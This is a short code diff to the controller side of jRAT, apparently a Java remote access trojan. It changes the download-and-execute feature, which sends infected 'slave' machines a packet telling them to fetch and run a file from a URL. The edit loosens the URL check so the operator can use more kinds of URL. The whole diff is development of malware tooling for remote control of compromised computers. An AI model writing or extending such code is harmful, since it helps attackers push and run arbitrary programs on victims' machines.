@@ -7,6 +7,7 @@ import se.jrat.client.AbstractSlave;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet17DownloadExecute;
 import se.jrat.client.utils.IconUtils;
+import se.jrat.client.utils.NetUtils;
 import se.jrat.client.utils.Utils;
 
 
@@ -39,7 +40,7 @@ public class DownloadAndExecEvent extends Event {
 		if (result == null) {
 			return false;
 		}
-		if (!result.startsWith("http://")) {
+		if (!NetUtils.isURL(result)) {
 			JOptionPane.showMessageDialog(null, "Input valid URL!", "Download URL", JOptionPane.ERROR_MESSAGE);
 			return false;
 		}
